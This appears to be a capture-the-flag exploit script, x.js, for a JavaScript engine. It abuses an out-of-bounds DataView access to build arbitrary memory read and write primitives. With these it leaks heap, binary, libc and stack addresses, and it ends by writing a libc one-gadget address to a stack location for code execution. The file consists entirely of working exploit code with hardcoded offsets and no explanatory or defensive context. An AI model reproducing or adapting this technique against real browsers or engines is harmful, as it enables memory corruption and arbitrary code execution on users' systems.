// x.js
function l32(u){
    let d = 0;
    for(let i = 0; i < 4; i++){
        d <<= 8;
        d = d | (u & 0xff);
        u = u >> 8;
    }
    return d;
}

var a = new ArrayBuffer(10);
var f = function(){print(1);}
var dv = new DataView(a);

var b = new ArrayBuffer(0x1337);
var c = new DataView(b);
var d = [c, c, c, c, f];


var lidx = 0;
for (let i = 1; i < 1000; i++){
    let v = dv.getUint32(i, 1);
    if(v == 0x1337){
        print("Found");
        lidx = i;
    }
}

var u32 = new Uint32Array(2);
u32[0] = dv.getUint32(lidx + 4, 1);
u32[1] = dv.getUint32(lidx + 8, 1);


//find heap addr
u32[0] -= 0xd90;
print(u32[0].toString(16), u32[1].toString(16));

//find bin addr
function abr(a, b){
    dv.setUint32(lidx + 4, l32(a));
    dv.setUint32(lidx + 8, l32(b));
    return c.getUint32(0, 1) + c.getUint32(4, 1) * 0x100000000;
}

let offset = 0x4d20a;
bin_addr = abr(u32[0] + 0x240 - 0x10, u32[1]) - offset;
print(bin_addr.toString(16));

//find libc addr
//libc addr offset
offset = 0x9d850;
got_offset = 0x69de0;
libc_addr = abr(bin_addr % 0x100000000 + got_offset - 0x10, u32[1]) - offset;
print(libc_addr.toString(16));

//leak canary
canary_offset = 0x1ef2e0;
stack_addr = abr(libc_addr % 0x100000000 + canary_offset - 0x10, libc_addr / 0x100000000);
print(stack_addr.toString(16));

function abw(a, b, o, v){
    dv.setUint32(lidx + 4, l32(a));
    dv.setUint32(lidx + 8, l32(b));
    c.setUint32(o, v);
}
//write malloc_hook
offset = 0x108;
abw(stack_addr % 0x100000000 - offset - 0x10, stack_addr / 0x100000000, 0, l32(libc_addr % 0x100000000 + 0xe6c81));
abw(stack_addr % 0x100000000 - offset - 0x10, stack_addr / 0x100000000, 4, l32(libc_addr / 0x100000000));
print(1);